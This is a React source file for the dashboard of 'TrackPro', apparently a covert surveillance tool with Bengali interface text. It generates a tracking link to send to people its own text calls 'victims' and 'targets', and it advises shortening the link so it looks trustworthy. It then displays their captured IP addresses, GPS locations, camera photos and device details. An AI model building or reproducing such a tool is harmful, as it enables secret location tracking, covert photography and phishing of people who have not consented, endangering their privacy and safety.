
import React, { useState, useEffect } from 'react';
import { auth, db } from '../firebase';
import { doc, getDoc, collection, query, where, onSnapshot, limit, orderBy, deleteDoc } from 'firebase/firestore';
import { useNavigate } from 'react-router-dom';

const Dashboard: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [logs, setLogs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [fullUrl, setFullUrl] = useState('');
  const [displayUrl, setDisplayUrl] = useState('');
  const [isShortening, setIsShortening] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const user = auth.currentUser;
    if (!user) return;

    const fetchUser = async () => {
      try {
        const docRef = doc(db, 'users', user.uid);
        const docSnap = await getDoc(docRef);
        if (docSnap.exists()) {
          setUserData(docSnap.data());
        }
      } catch (err) {
        console.error("Error fetching user:", err);
      }
    };
    fetchUser();

    // Setup Tracking Link
    const baseUrl = window.location.origin + window.location.pathname + "#/trk/" + user.uid;
    setFullUrl(baseUrl);
    setDisplayUrl(baseUrl);

    // Initial query with OrderBy
    const complexQuery = query(
      collection(db, 'tracking_logs'), 
      where('userId', '==', user.uid),
      orderBy('timestamp', 'desc'),
      limit(50)
    );

    const simpleQuery = query(
      collection(db, 'tracking_logs'), 
      where('userId', '==', user.uid),
      limit(50)
    );

    let unsubscribe: () => void;

    const startListening = (q: any, isFallback: boolean = false) => {
      return onSnapshot(q, 
        (snapshot) => {
          let logsData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
          if (isFallback) {
            logsData = logsData.sort((a: any, b: any) => 
              new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
            );
          }
          setLogs(logsData);
          setLoading(false);
          setError(null);
        },
        (err) => {
          console.error("Firestore Error:", err);
          if (err.code === 'failed-precondition' && !isFallback) {
            unsubscribe = startListening(simpleQuery, true);
            setError("ইনডেক্স তৈরি হচ্ছে, সাময়িকভাবে লিমিটেড ডাটা দেখানো হচ্ছে।");
          } else {
            setLoading(false);
            setError("তথ্য লোড করতে সমস্যা হচ্ছে। ইন্টারনেট কানেকশন চেক করুন।");
          }
        }
      );
    };

    unsubscribe = startListening(complexQuery);
    return () => unsubscribe && unsubscribe();
  }, []);

  const handleShorten = async (provider: string) => {
    setIsShortening(true);
    try {
      let targetUrl = '';
      if (provider === 'TinyURL') {
        targetUrl = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(fullUrl)}`;
      } else if (provider === 'is.gd') {
        targetUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(fullUrl)}`;
      } else if (provider === 'v.gd') {
        targetUrl = `https://v.gd/create.php?format=simple&url=${encodeURIComponent(fullUrl)}`;
      } else if (provider === 'da.gd') {
        targetUrl = `https://da.gd/s?url=${encodeURIComponent(fullUrl)}`;
      } else {
        alert('এই সার্ভিসটি বর্তমানে মেইনটেন্যান্স এ আছে।');
        setIsShortening(false);
        return;
      }

      // Using AllOrigins proxy to bypass CORS restrictions
      const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`;
      
      const response = await fetch(proxyUrl);
      if (!response.ok) throw new Error('Proxy connection failed');
      
      const data = await response.json();
      
      if (data && data.contents) {
        // Some APIs return status codes or errors in the body, but these are simple text ones
        const shortened = data.contents.trim();
        if (shortened.startsWith('http')) {
          setDisplayUrl(shortened);
          alert(`${provider} এর মাধ্যমে লিংক শর্ট করা হয়েছে!`);
        } else {
          throw new Error('Invalid response from shortener');
        }
      } else {
        throw new Error('Shortening failed');
      }
    } catch (err) {
      console.error(err);
      alert('লিংক শর্ট করতে সমস্যা হয়েছে। দয়া করে অন্য কোনো শর্টনার ট্রাই করুন।');
    } finally {
      setIsShortening(false);
    }
  };

  const copyLink = () => {
    navigator.clipboard.writeText(displayUrl);
    alert('লিঙ্ক কপি করা হয়েছে!');
  };

  const handleDeleteLog = async (id: string) => {
    if (window.confirm('আপনি কি নিশ্চিত যে এই লগটি ডিলিট করতে চান?')) {
      try {
        await deleteDoc(doc(db, 'tracking_logs', id));
      } catch (err) {
        alert('ডিলিট করতে সমস্যা হয়েছে।');
      }
    }
  };

  const handleLogout = () => {
    auth.signOut();
    navigate('/login');
  };

  if (loading) return (
    <div className="min-h-screen flex items-center justify-center bg-slate-950 text-white">
      <div className="flex flex-col items-center space-y-4">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
        <p className="text-slate-400 font-medium">ড্যাশবোর্ড লোড হচ্ছে...</p>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-slate-950 text-white pb-20">
      <nav className="glass sticky top-0 z-50 px-6 py-4 flex justify-between items-center border-b border-slate-800">
        <div className="flex items-center space-x-2">
          <div className="w-10 h-10 bg-gradient-to-br from-blue-600 to-indigo-700 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/20">
            <i className="fas fa-crosshairs text-white text-lg"></i>
          </div>
          <span className="text-2xl font-black tracking-tighter text-white">Track<span className="text-blue-500">Pro</span></span>
        </div>
        <div className="flex items-center space-x-4">
          <div className="hidden md:flex flex-col items-end">
            <span className="text-xs text-slate-500 font-bold uppercase tracking-widest">ব্যবহারকারী</span>
            <span className="text-blue-400 font-bold">{userData?.username || 'ইউজার'}</span>
          </div>
          <button onClick={handleLogout} className="bg-red-500/10 hover:bg-red-500/20 text-red-500 px-4 py-2 rounded-xl text-sm transition-all font-bold border border-red-500/20">
            লগআউট
          </button>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto p-4 md:p-8 space-y-8">
        {error && (
          <div className="bg-blue-500/10 border border-blue-500/50 text-blue-400 p-4 rounded-2xl text-sm flex items-center">
            <i className="fas fa-info-circle mr-3 text-lg"></i>
            <div><p className="font-bold">{error}</p></div>
          </div>
        )}

        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <h1 className="text-3xl font-extrabold tracking-tight text-white">ড্যাশবোর্ড ওভারভিউ</h1>
            <p className="text-slate-400">আপনার ট্র্যাকিং লিঙ্ক এবং ভিকটিম ডেটা</p>
          </div>
          <button onClick={() => window.location.reload()} className="bg-slate-800 hover:bg-slate-700 px-6 py-2.5 rounded-xl text-sm font-bold transition-all border border-slate-700 flex items-center shadow-lg">
             <i className="fas fa-sync-alt mr-2 text-blue-500"></i> রিফ্রেশ ডাটা
          </button>
        </div>

        {/* Stats Section */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
          <div className="glass p-6 rounded-3xl border-b-4 border-blue-500 shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between mb-4">
              <span className="text-slate-400 font-bold uppercase text-xs tracking-widest">মোট লগ ফাইল</span>
              <div className="w-12 h-12 bg-blue-500/10 rounded-2xl flex items-center justify-center text-blue-500 text-xl"><i className="fas fa-hdd"></i></div>
            </div>
            <div className="text-4xl font-black">{logs.length}</div>
            <div className="text-xs text-green-400 mt-2 font-bold"><i className="fas fa-chart-line mr-1"></i> একটিভ কানেকশন</div>
          </div>
          <div className="glass p-6 rounded-3xl border-b-4 border-purple-500 shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between mb-4">
              <span className="text-slate-400 font-bold uppercase text-xs tracking-widest">ডিভাইস ব্যাটারি</span>
              <div className="w-12 h-12 bg-purple-500/10 rounded-2xl flex items-center justify-center text-purple-500 text-xl"><i className="fas fa-battery-three-quarters"></i></div>
            </div>
            <div className="text-4xl font-black">{logs[0]?.device?.battery || '--'}%</div>
            <div className="text-xs text-slate-500 mt-2 font-medium">সর্বশেষ ভিকটিম ডিভাইস</div>
          </div>
          <div className="glass p-6 rounded-3xl border-b-4 border-amber-500 shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between mb-4">
              <span className="text-slate-400 font-bold uppercase text-xs tracking-widest">লিঙ্ক স্ট্যাটাস</span>
              <div className="w-12 h-12 bg-amber-500/10 rounded-2xl flex items-center justify-center text-amber-500 text-xl"><i className="fas fa-broadcast-tower"></i></div>
            </div>
            <div className="text-4xl font-black text-amber-500">Live</div>
            <div className="text-xs text-green-400 mt-2 font-bold">অনলাইন ও সক্রিয়</div>
          </div>
          <div className="glass p-6 rounded-3xl border-b-4 border-emerald-500 shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between mb-4">
              <span className="text-slate-400 font-bold uppercase text-xs tracking-widest">টার্গেট লোকেশন</span>
              <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl flex items-center justify-center text-emerald-500 text-xl"><i className="fas fa-map-marked-alt"></i></div>
            </div>
            <div className="text-4xl font-black">{logs.filter(l => l.location).length}</div>
            <div className="text-xs text-slate-500 mt-2 font-medium">লোকেশন পাওয়া গেছে</div>
          </div>
        </div>

        {/* Tracking Link Section */}
        <div className="glass p-8 rounded-[2rem] border border-blue-500/20 relative overflow-hidden group shadow-2xl">
          <div className="absolute -top-24 -right-24 w-64 h-64 bg-blue-600/10 rounded-full blur-[100px]"></div>
          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-8 relative z-10">
            <div className="space-y-4 max-w-xl">
              <div className="flex items-center space-x-3">
                <div className="bg-yellow-400/20 p-2 rounded-lg"><i className="fas fa-link text-yellow-400"></i></div>
                <h2 className="text-2xl font-black text-white">আপনার ট্র্যাকিং লিংক</h2>
              </div>
              <p className="text-slate-400 leading-relaxed">
                টার্গেটকে পাঠানোর জন্য নিচের যে কোনো একটি শর্টনার ব্যবহার করুন যাতে লিংকটি বিশ্বাসযোগ্য মনে হয়। Bitly/Cuttly এর পরিবর্তে আমরা <span className="text-blue-400 font-bold">v.gd</span> ও <span className="text-blue-400 font-bold">da.gd</span> সচল করেছি যা ১০০% কাজ করবে।
              </p>
              <div className="bg-slate-900/90 border-2 border-slate-700 p-1.5 rounded-2xl flex items-center shadow-inner group-focus-within:border-blue-500 transition-all">
                <div className="px-4 text-blue-500 font-mono text-sm truncate select-all">{displayUrl}</div>
                <button onClick={copyLink} className="ml-auto bg-blue-600 hover:bg-blue-500 text-white px-6 py-3 rounded-xl font-black text-sm transition-all transform active:scale-95 shadow-lg shadow-blue-600/30 whitespace-nowrap">
                  <i className="far fa-copy mr-2"></i> কপি করুন
                </button>
              </div>
              {displayUrl !== fullUrl && (
                <button onClick={() => setDisplayUrl(fullUrl)} className="text-xs text-slate-500 hover:text-white underline font-bold">অরিজিনাল লিংকে ফিরুন</button>
              )}
            </div>
            
            <div className="bg-slate-900/50 p-6 rounded-3xl border border-slate-800 space-y-4 min-w-[300px]">
               <div className="text-xs font-black text-slate-500 uppercase tracking-widest mb-2 flex items-center">
                 <i className="fas fa-bolt text-yellow-400 mr-2"></i> দ্রুত শর্টনার সার্ভিস
               </div>
               <div className="grid grid-cols-2 gap-2">
                 <button 
                   disabled={isShortening}
                   onClick={() => handleShorten('is.gd')}
                   className="bg-slate-800 hover:bg-blue-600/20 hover:text-blue-400 border border-slate-700 p-3 rounded-xl text-sm font-bold transition-all disabled:opacity-50"
                 >
                   is.gd
                 </button>
                 <button 
                   disabled={isShortening}
                   onClick={() => handleShorten('v.gd')}
                   className="bg-slate-800 hover:bg-blue-600/20 hover:text-blue-400 border border-slate-700 p-3 rounded-xl text-sm font-bold transition-all disabled:opacity-50"
                 >
                   v.gd
                 </button>
                 <button 
                   disabled={isShortening}
                   onClick={() => handleShorten('TinyURL')}
                   className="bg-slate-800 hover:bg-blue-600/20 hover:text-blue-400 border border-slate-700 p-3 rounded-xl text-sm font-bold transition-all disabled:opacity-50"
                 >
                   TinyURL
                 </button>
                 <button 
                   disabled={isShortening}
                   onClick={() => handleShorten('da.gd')}
                   className="bg-slate-800 hover:bg-blue-600/20 hover:text-blue-400 border border-slate-700 p-3 rounded-xl text-sm font-bold transition-all disabled:opacity-50"
                 >
                   da.gd
                 </button>
               </div>
               {isShortening && <p className="text-[10px] text-center text-blue-400 animate-pulse font-bold mt-2">লিংক তৈরি হচ্ছে...</p>}
            </div>
          </div>
        </div>

        {/* Activity Logs Section */}
        <div className="space-y-6">
          <div className="flex items-center justify-between">
            <h2 className="text-2xl font-black flex items-center text-white">
              <i className="fas fa-stream text-blue-500 mr-3"></i> রিয়েল-টাইম তথ্য লগ
            </h2>
          </div>

          {logs.length === 0 ? (
            <div className="glass p-20 rounded-[2.5rem] text-center border-dashed border-2 border-slate-800 shadow-2xl">
              <i className="fas fa-ghost text-5xl text-slate-700 mb-6 block"></i>
              <h3 className="text-xl font-bold text-slate-300">এখনও কোনো ভিকটিম ধরা পড়েনি</h3>
              <p className="text-slate-500 mt-2">আপনার তৈরি করা লিংকটি টার্গেটকে পাঠিয়ে অপেক্ষা করুন।</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-6">
              {logs.map((log) => (
                <div key={log.id} className="glass p-6 rounded-3xl border border-slate-800 hover:border-blue-500/50 transition-all duration-500 group shadow-lg">
                  <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
                    <div className="flex items-center space-x-6 w-full">
                      <div className="relative">
                        <div className="w-24 h-24 rounded-2xl overflow-hidden border-2 border-slate-700 shadow-2xl bg-slate-900 group-hover:scale-105 transition-transform duration-500">
                          {log.images && log.images[0] ? (
                            <img src={log.images[0]} alt="Target" className="w-full h-full object-cover" />
                          ) : (
                            <div className="w-full h-full flex items-center justify-center text-slate-600"><i className="fas fa-camera text-2xl"></i></div>
                          )}
                        </div>
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex flex-wrap items-center gap-2 mb-1">
                           <span className="text-2xl font-black text-white">IP: {log.ip || 'অজানা'}</span>
                           <span className="bg-blue-500/10 text-blue-400 text-[10px] font-black px-2 py-1 rounded-lg border border-blue-500/20 uppercase tracking-tighter">{log.device?.os}</span>
                        </div>
                        <div className="text-sm text-slate-500 font-bold"><i className="far fa-clock mr-2 text-blue-500"></i> {new Date(log.timestamp).toLocaleString('bn-BD')}</div>
                        <div className="mt-3 flex gap-2 overflow-x-auto pb-1">
                           {log.images?.slice(1).map((img: string, i: number) => (
                             <img key={i} src={img} className="w-12 h-12 rounded-xl border border-slate-800 hover:border-blue-500 transition-colors shadow-md" alt="Extra" />
                           ))}
                        </div>
                      </div>
                    </div>

                    <div className="flex md:flex-col lg:flex-row items-center gap-3 w-full md:w-auto">
                       {log.location ? (
                         <a href={`https://www.google.com/maps/search/?api=1&query=${log.location.lat},${log.location.lng}`} target="_blank" rel="noreferrer" className="flex-1 md:flex-none flex items-center justify-center space-x-2 bg-emerald-500 hover:bg-emerald-400 text-slate-950 px-8 py-4 rounded-2xl font-black transition-all shadow-lg active:scale-95">
                           <i className="fas fa-map-marked-alt"></i><span>ম্যাপে দেখুন</span>
                         </a>
                       ) : (
                         <div className="flex-1 md:flex-none bg-slate-800 text-slate-500 px-8 py-4 rounded-2xl text-sm font-bold opacity-50 italic text-center">লোকেশন অফ</div>
                       )}
                       <button onClick={() => handleDeleteLog(log.id)} className="p-4 bg-slate-800 hover:bg-red-500/20 hover:text-red-500 text-white rounded-2xl transition-all border border-slate-700 shadow-xl group/del">
                          <i className="fas fa-trash-alt group-hover/del:scale-110 transition-transform"></i>
                       </button>
                    </div>
                  </div>
                  
                  {/* Detailed Grid */}
                  <div className="mt-8 grid grid-cols-2 md:grid-cols-4 gap-6 pt-6 border-t border-slate-800/50">
                     <div className="space-y-1">
                        <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center"><i className="fas fa-bolt mr-2 text-yellow-400"></i> ব্যাটারি</div>
                        <div className="text-sm font-bold text-white">{log.device?.battery}% চার্জ</div>
                     </div>
                     <div className="space-y-1">
                        <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center"><i className="fas fa-desktop mr-2 text-blue-400"></i> রেজোলিউশন</div>
                        <div className="text-sm font-bold text-white">{log.device?.screenSize}</div>
                     </div>
                     <div className="space-y-1">
                        <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center"><i className="fas fa-globe-asia mr-2 text-purple-400"></i> ব্রাউজার</div>
                        <div className="text-sm font-bold text-white truncate">{log.device?.browser || 'অজানা'}</div>
                     </div>
                     <div className="space-y-1">
                        <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center"><i className="fas fa-microchip mr-2 text-emerald-400"></i> প্ল্যাটফর্ম</div>
                        <div className="text-sm font-bold text-white truncate">{log.device?.platform}</div>
                     </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </main>

      <footer className="mt-20 py-12 text-center border-t border-slate-900 bg-slate-950/50 backdrop-blur-sm">
         <p className="text-slate-600 text-[10px] font-black uppercase tracking-[0.3em] mb-4">TrackPro Premium Security Dashboard v3.0</p>
         <div className="inline-block p-1 rounded-2xl bg-gradient-to-r from-blue-600 to-purple-600 mb-4">
            <div className="bg-slate-950 px-10 py-4 rounded-[0.9rem]">
               <p className="text-blue-400 text-sm font-black uppercase tracking-widest">
                  Developed by <span className="text-white">Arefin Foysal</span>
               </p>
            </div>
         </div>
         <div className="text-slate-500 text-[9px] font-bold uppercase tracking-widest mt-2">
            © ২০২৬ সকল স্বত্ব সংরক্ষিত | আরফিন ফয়সাল কর্তৃক ডিজাইনকৃত
         </div>
      </footer>
    </div>
  );
};

export default Dashboard;
